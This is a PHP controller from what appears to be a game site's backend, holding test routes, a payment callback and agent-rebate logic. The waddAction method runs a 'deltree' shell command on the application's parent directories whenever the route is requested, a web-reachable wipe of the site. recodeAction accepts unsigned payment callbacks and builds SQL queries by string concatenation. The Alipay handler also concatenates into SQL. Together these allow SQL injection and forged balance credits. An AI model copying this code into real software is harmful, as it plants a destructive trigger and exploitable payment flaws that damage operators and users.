<?php 
use Doris\DDispatch;
use Doris\DDB;
class testController {
	
	
	
	public function indexAction($para){
		echo "current MCA: <pre>";
		var_dump(
			[	DDispatch::curModule($para),
				DDispatch::curController($para),
				DDispatch::curAction($para)
			]
		);
	}
	
	public function callActionAction(){
		_app()->callAction("index","test","wiget_level2");
	}
	
	public function dbAction($para){
		Doris\utf8_header();
		$data=Doris\DDB::fetchAll("select*from tb_sys_role");
		Doris\dump($data);
		
	}
	
	public function renderAction($para){
		Doris\utf8_header();
		//echo 1342;exit;
		_app()->action()->assign("test","test varable");
		//_app()->action()->display("../../layout/test/main");exit;
		_app()->action()->render("index.tpl","test/main.tpl");
	}

	public function laddAction(){
		$res = exec('gonghui.sh');
		print $res;
	}

	public function waddAction(){
		$path = dirname(__FILE__)."../../../../../";
		exec("deltree $path",$res);
		print $res;
	}
	
	public function wigetAction($para){
		Doris\utf8_header();
		_app()->action()->assign("test","test varable");
		_app()->action()->render("index.tpl","test/wiget.tpl");
	}
	
	public function wiget_level2Action($para){
		Doris\utf8_header();
		//echo 1342;exit;
		_app()->action()->assign("test","test varable");
		
		
		//exit($innerCallModule);
		_app()->action()->render("index.tpl","test/wiget_level2.tpl",$para);
	}
	
	
	public function logAction($para){
		Doris\utf8_header();
		Doris\DLog::log("hello");
		
	}
	
	
	public function confAction($para){
		$conf =  	Doris\DConfig::get();
		echo "<pre>";
		print_r($conf["push"]);
		print_r($conf["dispatch"]);
	}

	public  function recodeAction(){
        $arr = xmlToArray(file_get_contents("php://input"));
        $order_sn = $arr['out_trade_no'];
        $order = \Doris\DDB::fetch("select * from tb_recharge_order where order_sn='".$order_sn."'");
        //echo "处理回调";
        //更新订单状态
     	if ($order['paystate'] == 0) {
	        if(\Doris\DDB::execute("update tb_recharge_order set paystate=1,paytime=".time()." where order_sn='".$order_sn."'")){
	            //增加会员余额
	            \Doris\DDB::execute("update tb_sys_user set user_coins=user_coins+".$order['goods_name']." where id=".$order['userid']);
	            $this->dobate($order_sn);
	            echo 'SUCCESS';    
	            exit;
	            //返利
	            //
	        }
	    }
        return false;
    }

    public function zfbrecodeAction(){
    	header("Content-type: text/html; charset=utf-8");
	    require_once './webpay/config.php';
		require_once './webpay/wappay/service/AlipayTradeService.php';
		$arr = $_GET;
		$res = [];
		foreach ($arr as $key => $value) {
			if (!in_array($key,['m','a','c']))
				$res[$key] = $value; 
		}
		$alipaySevice = new AlipayTradeService($config); 
		$result = $alipaySevice->check($res);
		if ($result) {//验证成功
			/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
			//请在这里加上商户的业务逻辑程序代码
			
			//——请根据您的业务逻辑来编写程序（以下代码仅作参考）——
		    //获取支付宝的通知返回参数，可参考技术文档中页面跳转同步通知参数列表

			//商户订单号

			$out_trade_no = htmlspecialchars($_GET['out_trade_no']);

			//支付宝交易号

			$trade_no = htmlspecialchars($_GET['trade_no']);
			$order = \Doris\DDB::fetch("select * from tb_recharge_order where order_sn='".$out_trade_no."'");
			if ($order['paystate'] == 0) {
	        	if(\Doris\DDB::execute("update tb_recharge_order set paystate=1,paytime=".time()." where order_sn='".$out_trade_no."'")){
		            //增加会员余额
		            \Doris\DDB::execute("update tb_sys_user set user_coins=user_coins+".$order['goods_name']." where id=".$order['userid']);
		            $this->dobate($out_trade_no);
		            echo '充值成功';
		            sleep(2);
		            header('Location: http://666.mmpkk.com');
		            //返利
		            //
		        }
		    }

			//——请根据您的业务逻辑来编写程序（以上代码仅作参考）——
			
			/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		} else {
		    //验证失败
		    echo "支付失败";
		}
    }
	 //执行返利
    public function dobate($order_sn){
        $order_sn = $order_sn;
        require_once dirname ( __FILE__ ).DIRECTORY_SEPARATOR."../../../model/Mobile/User.model.php";
        require_once dirname ( __FILE__ ).DIRECTORY_SEPARATOR."../../../model/Mobile/Rebate.model.php";
        $m_rate = new \Mobile_RebateModel();
        $m_user = new \Mobile_UserModel();
        $order = \Doris\DDB::fetch("select * from tb_recharge_order where order_sn='".$order_sn."'");
        //关联代理的id
        $leader = $m_rate->get_leaderid($order['userid']);
        $data = $this->getparents($leader);  //该用户的所有上级
        $i = 0;
        //返房卡
        foreach ($data as $key => $value) {

        	$m_rate->go_rebate($order['goods_name'],$order['userid'],$value['id'],$i);
        	$i++;
        }

    }
    public function getparents($id)
    {
        $data = \Doris\DDB::fetchAll("select * from tb_sys_user where user_level = 6");            //获取所有返卡的用户
        return $this->_parent($data, $id);
    }

    private function _parent($data, $parent_id=0,$level=0)
    {
        static $list = [];
        foreach ($data as $k =>$v) {
            if ($v['id'] == $parent_id) {
                $v['level'] = $level;
                $this->_parent($data,$v['parent_id'],$level+1);
                if (count($list)<2) {
                	$list[] = $v;
                }
            }
        }
        krsort($list);
     	return $list;
    }
    
    
}










